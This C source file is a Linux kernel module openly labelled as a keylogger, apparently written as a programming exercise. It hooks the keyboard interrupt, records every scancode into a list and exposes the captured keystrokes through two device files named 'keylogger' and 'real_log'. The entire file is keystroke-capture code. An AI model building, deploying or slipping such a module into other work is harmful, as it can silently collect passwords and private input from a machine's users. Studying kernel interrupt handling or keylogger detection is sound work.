#include "keyboard.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("stmartin");
MODULE_DESCRIPTION("Module keylog");

t_keylst	*k_lst = NULL;
int		key_read_done = 0;
int		log_read_done = 0;
//struct file *fp = (struct file *) NULL;

static ssize_t	key_read(struct file *filep, char *buffer, size_t len, loff_t *offset)
{
	if (key_read_done == 0 && browse_linked_list(k_lst, buffer, &offset, len, 1) == 2)
	{
		key_read_done = 1;
		return (*offset);
	}
	return key_read_done = 0;
}

static ssize_t	log_read(struct file *filep, char *buffer, size_t len, loff_t *offset)
{
	if (log_read_done == 0 && browse_linked_list(k_lst, buffer, &offset, len, 2) == 2)
	{
		log_read_done = 1;
		return (*offset);
	}
	return log_read_done = 0;
}

/*
static ssize_t	key_write(struct file *filep, const char *buffer, size_t len, loff_t *offset)
{
	ssize_t ret;
	ret = vfs_write(fp, "test", 4, offset);
	printk(KERN_INFO "keylogger: in the write call");
	return ret;
}
*/
static struct file_operations	key_ops = {

	.owner = THIS_MODULE,
	.read = key_read,
	//.write = key_write
};

static struct file_operations	log_ops = {

	.owner = THIS_MODULE,
	.read = log_read,
};

static struct miscdevice	key_dev = {
	.minor = MISC_DYNAMIC_MINOR,
        .name = "keylogger",
        .fops = &key_ops
};

static struct miscdevice	log_dev = {
	.minor = MISC_DYNAMIC_MINOR,
        .name = "real_log",
        .fops = &log_ops
};

static irqreturn_t 	kbd_irq_handler(int irq, void* dev_id)
{
	unsigned char	scancode;

	key_read_done = 0;
	log_read_done = 0;
	scancode = inb(KEYBOARD_DATA);
	if (add_to_list(scancode))
	{
		printk(KERN_INFO "kmalloc failed\n");
		return 1;
	}
	return IRQ_HANDLED;
}

static int		__init keylogger_init(void)
{
	
//	fp = filp_open(FILE_NAME, O_CREAT | O_RDWR, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);

	if (misc_register(&key_dev))
		return 1;
	if (misc_register(&log_dev))
		return 1;
	if (request_irq(KBD_IRQ, kbd_irq_handler, IRQF_SHARED, "keylogger", (void *)kbd_irq_handler))
	{
		printk(KERN_INFO "something went wrong in request_irq\n");
		return -EIO;
	}
	return 0;
}

static void		__exit keylogger_exit(void)
{
	free_irq(KBD_IRQ, (void *)kbd_irq_handler);
	//filp_close(fp, NULL);
	misc_deregister(&key_dev);
	misc_deregister(&log_dev);
}

module_init(keylogger_init);
module_exit(keylogger_exit);
